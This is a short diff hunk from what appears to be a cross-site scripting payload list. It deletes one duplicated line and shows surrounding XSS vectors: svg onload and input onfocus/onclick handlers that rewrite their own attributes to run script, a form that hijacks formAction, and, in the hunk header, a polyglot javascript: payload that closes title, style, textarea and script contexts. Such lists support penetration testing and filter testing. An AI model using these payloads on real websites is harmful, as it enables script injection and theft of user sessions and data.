@@ -1111,7 +1111,6 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <svg onload=\"attributes[0].value=name,new onload\">
 <svg onload=\"attributes[0].value=id+URL+id,new onload\" id=`>
 <input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>
-<input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>
 <input onclick=attributes[0].value='`'+URL+'`'>
 <form><input onclick=\"formAction=top.name,type='submit',new submit\">
 <svg onload=innerHTML=URL,innerHTML=textContent>
